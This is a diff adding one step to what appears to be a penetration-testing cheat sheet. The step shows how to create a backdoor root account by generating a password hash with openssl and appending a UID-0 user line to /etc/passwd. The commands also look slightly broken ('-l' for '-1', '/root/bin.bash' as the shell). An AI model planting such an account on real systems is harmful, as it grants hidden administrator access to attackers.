@@ -1646,6 +1646,12 @@ Internet traffic on port 80 redirection from Kali to Victim
 	```
 	sudo  -u USER PROGRAM
 	```
+15. Create /etc/passwd user and password
+	```
+	openssl passwd -l -salt user password
+	nano /etc/passwd
+	user:$1$user$Wz5uEtHgU0fEztAejphdY/:0:0::/root/bin.bash
+	```
 
 ## Useful Linux Commands
 ### Find a file
